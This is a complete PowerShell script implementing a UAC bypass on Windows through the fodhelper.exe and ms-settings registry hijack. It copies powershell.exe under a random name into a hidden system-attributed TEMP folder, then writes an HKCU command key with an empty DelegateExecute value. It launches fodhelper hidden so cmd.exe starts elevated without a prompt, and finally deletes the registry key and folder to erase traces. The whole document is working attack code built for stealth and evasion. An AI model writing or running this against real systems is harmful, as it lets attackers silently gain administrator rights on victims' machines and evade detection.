# Get the TEMP path for minimal visibility
$tempPath = $env:TEMP

# Generate a random folder name using a GUID
$randomFolderName = [guid]::NewGuid().ToString()
$hiddenFolderPath = Join-Path -Path $tempPath -ChildPath $randomFolderName

# Create the hidden folder silently
try {
    New-Item -Path $hiddenFolderPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
    attrib +s +h $hiddenFolderPath
} catch {
    # Silently exit on failure
    exit
}

# Generate a unique name for the PowerShell executable
$uniqueExeNamePowershell = [guid]::NewGuid().ToString()
$fullUniqueExePowershell = "$uniqueExeNamePowershell.exe"
$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExePowershell

# Copy PowerShell.exe to the hidden folder silently
$sourcePowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
try {
    if (Test-Path $sourcePowershellPath) {
        Copy-Item -Path $sourcePowershellPath -Destination $destinationPathPowershell -Force -ErrorAction Stop
    } else {
        exit
    }
} catch {
    exit
}

# Define the commands to execute silently (no script file written to disk)
$commandsToExecute = "Start-Process cmd.exe"

# Create registry key for UAC bypass
$regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"
try {
    New-Item -Path $regKeyPath -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force -ErrorAction Stop | Out-Null
    $command = "$destinationPathPowershell -WindowStyle Hidden -Command `"$commandsToExecute`""
    Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force -ErrorAction Stop
} catch {
    exit
}

# Trigger fodhelper.exe silently to bypass UAC
$fodhelperPath = "C:\Windows\System32\fodhelper.exe"
try {
    if (Test-Path $fodhelperPath) {
        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden -ErrorAction Stop
    } else {
        exit
    }
} catch {
    exit
}

# Wait for the PowerShell process to complete
try {
    $isPowershellRunning = $true
    while ($isPowershellRunning) {
        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
        if ($process -eq $null) {
            $isPowershellRunning = $false
        }
        Start-Sleep -Seconds 3
    }
} catch {
    # Ignore errors and proceed to cleanup
}

# Clean up registry key
try {
    if (Test-Path $regKeyPath) {
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction Stop
    }
} catch {
    # Silent failure, manual cleanup may be needed
}

# Clean up hidden folder
try {
    attrib -s -h $hiddenFolderPath
    if (Test-Path $hiddenFolderPath) {
        Remove-Item -Path $hiddenFolderPath -Recurse -Force -ErrorAction Stop
    }
} catch {
    # Silent failure, manual cleanup may be needed
}
